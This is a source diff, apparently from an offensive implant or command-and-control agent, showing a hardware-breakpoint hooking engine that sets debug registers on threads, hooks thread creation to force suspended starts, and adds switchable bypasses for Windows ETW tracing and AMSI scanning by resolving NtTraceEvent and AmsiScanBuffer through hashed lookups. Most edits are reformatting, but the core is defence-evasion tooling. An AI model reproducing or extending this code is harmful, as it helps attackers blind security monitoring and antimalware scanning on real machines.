@@ -61,35 +61,35 @@ auto DECLFN HwbpEng::SetBreak(
 ) -> BOOL {
     if (Drx < 0 || Drx > 3) return FALSE;
 
-    CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
-    HANDLE Handle = INVALID_HANDLE_VALUE;
-    NTSTATUS Status;
+    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+    HANDLE   Handle = INVALID_HANDLE_VALUE;
+    NTSTATUS Status = STATUS_SUCCESS;
 
-    if (ThreadID != Self->Session.ThreadID) {
-        Handle = Self->Td->Open(THREAD_ALL_ACCESS, FALSE, ThreadID);
-        if (Handle == INVALID_HANDLE_VALUE) return FALSE;
+    if ( ThreadID != Self->Session.ThreadID ) {
+        Handle = Self->Td->Open( THREAD_ALL_ACCESS, FALSE, ThreadID );
+        if ( Handle == INVALID_HANDLE_VALUE ) return FALSE;
     } else {
         Handle = NtCurrentThread();
     }
 
-    Status = Self->Ntdll.NtGetContextThread(Handle, &Ctx);
+    Status = Self->Ntdll.NtGetContextThread( Handle, &Ctx );
     if (!NT_SUCCESS(Status)) {
-        if (Handle != NtCurrentThread()) Self->Ntdll.NtClose(Handle);
+        if ( Handle != NtCurrentThread() ) Self->Ntdll.NtClose( Handle );
         return FALSE;
     }
 
     if (Init) {
         (&Ctx.Dr0)[Drx] = Address;
-        Ctx.Dr7 = SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // active breakpoint
+        Ctx.Dr7 = this->SetDr7( Ctx.Dr7, 3, (Drx * 2), 2 ); // active breakpoint
     } else {
         (&Ctx.Dr0)[Drx] = 0;
-        Ctx.Dr7 = SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // desactive breakpoint
+        Ctx.Dr7 = this->SetDr7( Ctx.Dr7, 0, (Drx * 2), 2 ); // desactive breakpoint
     }
 
-    Status = Self->Ntdll.NtSetContextThread(Handle, &Ctx);
+    Status = Self->Ntdll.NtSetContextThread( Handle, &Ctx );
     
-    if (Handle != NtCurrentThread()) {
-        Self->Ntdll.NtClose(Handle);
+    if ( Handle != NtCurrentThread() ) {
+        Self->Ntdll.NtClose( Handle );
     }
 
     return NT_SUCCESS(Status);
@@ -110,46 +110,32 @@ auto DECLFN HwbpEng::Uninstall(
         PDESCRIPTOR_HOOK Next = Current->Next; 
 
         if ( Current->Address == Address && Current->ThreadID == ThreadID ) {
-    
             Found = TRUE;
-
-            Drx = Current->Drx;
+            Drx   = Current->Drx;
 
             if ( Current == Threads ) {
-        
                 Threads = Current->Next;
-        
             }
 
             if ( Current->Next ) {
-        
                 Current->Next->Prev = Current->Prev;
-        
             }
 
             if ( Current->Prev ) {
-        
                 Current->Prev->Next = Current->Next;
-        
             }
 
             if ( Current ) {
-        
                 Self->Hp->Free( Current );
-        
             }
         }
 
-
         Current = Next;
-
     }
 
     Self->Ntdll.RtlLeaveCriticalSection( CritSec );
     if ( Found ) {
-
         Flag = Insert( Address, Drx, FALSE, ThreadID );
-
     }
 
     return Flag;
@@ -273,7 +259,7 @@ _KH_END:
 auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
     if ( Initialized ) return TRUE;
     
-    CritSec = (PRTL_CRITICAL_SECTION)Self->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( RTL_CRITICAL_SECTION ) );
+    CritSec = (RTL_CRITICAL_SECTION*)Self->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( RTL_CRITICAL_SECTION ) );
 
     if ( !CritSec->DebugInfo ) {
 
@@ -396,7 +382,7 @@ auto DECLFN HwbpEng::NtCreateThreadExHk(
     _In_ PCONTEXT Ctx
 ) -> VOID {
     HANDLE  Timer  = INVALID_HANDLE_VALUE;
-    PHANDLE Handle = (PHANDLE)GET_ARG_1( Ctx );
+    HANDLE* Handle = (HANDLE*)GET_ARG_1( Ctx );
     ULONG   Flags  = GET_ARG_7( Ctx );
     Flags = Flags | THREAD_CREATE_FLAGS_CREATE_SUSPENDED;
 
@@ -421,17 +407,24 @@ auto DECLFN HwbpEng::NtCreateThreadExHkThunk(
 auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
     if( !Init() ) return FALSE;
 
-    if ( !this->Etw.NtTraceEvent ) {
-        this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
-        KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
-    }
+    if ( this->DotnetBypass ) {
 
-    if ( !this->Amsi.Handle ) {
-        this->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
+        if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
+            if ( !this->Etw.NtTraceEvent ) {
+                this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
+                KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
+            }
+        }
 
-        if ( this->Amsi.Handle ) {
-            this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
-            KhDbg("AmsiScanBuffer %p %X", this->Amsi.AmsiScanBuffer, this->Amsi.AmsiScanBuffer );
+        if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
+            if ( !this->Amsi.Handle ) {
+                this->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
+
+                if ( this->Amsi.Handle ) {
+                    this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
+                    KhDbg("AmsiScanBuffer %p %X", this->Amsi.AmsiScanBuffer, this->Amsi.AmsiScanBuffer );
+                }
+            }
         }
     }
 
